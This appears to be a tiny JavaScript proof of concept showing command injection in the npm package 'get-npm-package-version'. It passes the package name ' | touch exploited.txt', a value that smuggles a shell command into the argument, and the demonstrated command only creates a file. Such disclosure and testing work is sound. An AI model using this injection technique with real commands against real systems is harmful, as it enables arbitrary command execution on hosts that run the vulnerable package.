const pkg = require('get-npm-package-version');

const payload = " | touch exploited.txt";

console.log(pkg);

const packageName = payload;

pkg(packageName);